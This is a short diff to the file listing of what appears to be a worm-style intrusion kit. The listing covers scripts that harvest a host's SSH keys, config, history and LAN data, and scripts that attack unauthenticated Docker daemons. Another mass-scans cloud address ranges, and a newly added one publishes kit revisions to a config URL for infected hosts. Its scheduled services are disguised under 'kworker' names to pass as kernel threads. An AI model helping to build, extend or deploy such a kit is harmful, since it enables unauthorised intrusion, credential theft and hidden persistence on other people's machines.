@@ -74,6 +74,7 @@ Numbered sections mirroring the phases, every command copy-pasteable, the three 
 - `loot.sh`         - the host's own trust graph: ssh config, known_hosts, its own keys, history, LAN
 - `dock.sh`         - exposed docker daemons (:2375/:2376): no key, no user, no pairing, curl only
 - `dockmass.sh`     - sweeps cloud /16 space for exposed daemons: the docker vector's volume arm
+- `publish.sh`      - push the kit to CONFIG_URL; hosts only ever see published revisions
 - `kworker-spread.service/.timer`, `kworker-hunt.service/.timer`, `kworker-loot.service/.timer`, `kworker-dock.service/.timer`, `kworker-mass.service/.timer` - schedules
 - `README.md`       - hosting, one-liner deploy, verification, threat model
 
